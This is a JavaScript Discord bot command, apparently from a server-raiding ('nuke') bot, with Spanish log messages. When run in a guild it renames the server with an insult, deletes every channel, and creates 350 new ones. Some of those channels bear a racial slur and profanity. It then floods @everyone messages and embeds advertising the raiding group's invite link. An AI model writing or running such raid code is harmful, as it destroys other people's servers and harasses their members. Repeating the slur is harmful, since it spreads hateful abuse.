const axios = require("axios");
const config = require("../config.json");
const Discord = require("discord.js");

module.exports = {
    name: 'on',
    async execute(message, args) {

        message.guild.setName(`Fxcked by Unexpected & ${message.author.username}`)
        try {
            const channelsToDelete = message.guild.channels.cache

            const deletePromises = channelsToDelete.map(channel =>
                channel.delete().catch(err => console.error(`Error al eliminar el canal ${channel.id}:`, err))
            );

            await Promise.allSettled(deletePromises);

            const channelNames = [
                "get fucked",
                "always on the top",
                "Unexpected is here",
                "fuck niggas"
            ];

            const serverId = message.guild.id;
            await createChannels(serverId, channelNames, 350);

            setTimeout(async () => {
                const messageContent = "|| @everyone || Mierda poderada por **Unexpected** https://discord.gg/86N2qMVX7Z";
                const channels = message.guild.channels.cache.filter(channel => channel.type === 'text').array().slice(0, 100);

                for (const channel of channels) {
                    try {
                        for (let i = 0; i < 5; i++) {
                            sendMessage(channel, messageContent);
                             sendEmbed(channel);

                        }
                    } catch (error) {
                        console.error(`[CONSOLE]: Error en el canal ${channel.id}: ${error}`);
                    }
                    
                }
            }, 3000);

        } catch (error) {
            console.error('¡Error al ejecutar el comando "on"', error);
        }
    }
};

async function createChannels(serverId, channelNames, totalChannels) {
    try {
        for (let i = 0; i < totalChannels; i++) {
            const channelName = channelNames[i % channelNames.length];
            await createChannel(serverId, channelName);
            await sleep(20)
        }
    } catch (error) {
        console.error('Error al crear canales', error);
    }
}

async function createChannel(serverId, channelName) {
    try {
        axios.post(`https://discord.com/api/v9/guilds/${serverId}/channels`, {
            name: channelName,
            type: 0
        }, {
            headers: {
                Authorization: `Bot ${config.token}`,
                'Content-Type': 'application/json'
            }
        });
    } catch (err) {
        if (err.response && err.response.status === 429) {
            const retryAfter = err.response.headers['retry-after'];
            if (retryAfter) {
                await sleep(retryAfter * 1000);
                await createChannel(serverId, channelName);
            }
            return;
        }
        console.error(`Error al crear el canal ${channelName}:`, err);
    }
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function sendMessage(channel, message) {
    try {
        await channel.send(message);
    } catch (err) {
        console.error(`[CONSOLE]: Error al enviar el mensaje en el canal ${channel.id}: ${err}`);
    }
}

async function sendEmbed(channel) {
    try {
        const embed = new Discord.MessageEmbed()
            .setTitle(`ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤRaid by #Unexpectedㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ#UnexpectedOnTopㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ${m}`)
            .setDescription("ㅤㅤㅤㅤㅤㅤㅤㅤ**Raided by Unexpected**\nㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ[BOT HERE](https://discord.gg/86N2qMVX7Z)")
            .setFooter("Unexpected")
            .setColor("#ffffff")
            .setImage("https://media.discordapp.net/attachments/972533899462836334/1094951141479034961/trim.48FE0095-7F4A-4AB0-8A3D-057BE198B595.gif?ex=666f78f7&is=666e2777&hm=8a997cc7f99251f383769614b0b7b24534658392cf264bf805756d2eb9c4526b&=");

            await channel.send(embed);
    } catch (err) {
        console.error(`[CONSOLE]: Error al enviar el embed en el canal ${channel.id}: ${err}`);
    }
}